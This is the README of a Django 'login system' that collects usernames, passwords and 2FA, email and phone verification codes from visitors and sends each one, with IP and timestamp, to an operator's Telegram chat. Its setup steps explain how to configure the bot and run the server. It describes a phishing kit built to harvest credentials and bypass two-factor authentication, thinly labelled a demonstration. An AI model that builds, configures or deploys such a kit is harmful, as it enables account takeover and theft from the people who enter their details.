# Django Login Project with Telegram Integration

A Django-based login system that captures user credentials and verification codes, sending all data to Telegram in real-time.

## Features

- **Login Form**: Captures email/username/phone and password
- **2FA Modal**: Two-factor authentication code input
- **Email Verification**: Email verification code modal
- **Phone Verification**: Phone verification code modal
- **Telegram Integration**: All data sent to Telegram instantly
- **Session-Based**: No database required (uses Django sessions)
- **Mobile-Responsive**: Modern UI with bottom modals

## Setup

1. **Install Dependencies**:
   ```bash
   pip install -r requirements.txt
   ```

2. **Configure Telegram Bot**:
   - Create bot with @BotFather on Telegram
   - Get bot token and chat ID
   - Update `.env` file with your credentials

3. **Environment Variables**:
   ```env
   TELEGRAM_BOT_TOKEN=your_bot_token_here
   TELEGRAM_CHAT_ID=your_chat_id_here
   ```

4. **Run Server**:
   ```bash
   python manage.py runserver
   ```

5. **Test Telegram**:
   Visit `/test-telegram/` to verify Telegram integration

## Usage

1. **Login**: Enter credentials → Telegram notification
2. **2FA**: Enter 2FA code → Telegram notification  
3. **Email Verification**: Enter email code → Telegram notification
4. **Phone Verification**: Enter phone code → Telegram notification

## Telegram Messages

The system sends 4 separate messages:
- Login credentials with IP and timestamp
- 2FA verification code
- Email verification code with user info
- Phone verification code with user info

## Security Note

This is a demonstration project. In production:
- Never store passwords in plain text
- Use proper authentication systems
- Implement security best practices